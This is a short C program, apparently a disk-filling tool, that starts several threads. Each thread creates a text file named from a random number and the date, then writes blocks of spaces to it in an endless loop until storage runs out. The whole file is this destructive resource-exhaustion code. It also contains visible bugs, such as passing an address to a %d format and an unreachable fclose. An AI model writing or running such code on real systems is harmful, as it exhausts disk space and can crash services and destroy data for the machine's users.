#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>


void *main1(void *suff){
time_t rawtime;
time(&rawtime);
char *date=ctime(&rawtime);

int r=rand();

FILE *fp;
//char *fname=ctime(&rawtime);

char fname[4096]="";
char *ext=".txt";
char *sep=".";

sprintf(fname,"%d",&r);
strcat(fname,sep);
strtok(date,"\n");
strcat(fname,date);
strcat(fname,ext);
fp = fopen(fname,"w+");

char flood[4096]={0,};
for ( int i=0 ; i < sizeof(flood) ; i++){
	flood[i]=' ';
}
 int x=1;
 while ( x == 1 ) {
  fputs(flood,fp);
 }
fclose(fp);
}
int main(){
int thr_id[10];
pthread_t tid;
for ( int i=0 ; i < 6 ; i++ ){
	thr_id[i]=pthread_create(&tid,NULL,main1,NULL);
	if (!(i < 5 )) {
	 pthread_join(tid,NULL);
	}
}
main1(NULL);
pthread_join(tid,NULL);
}
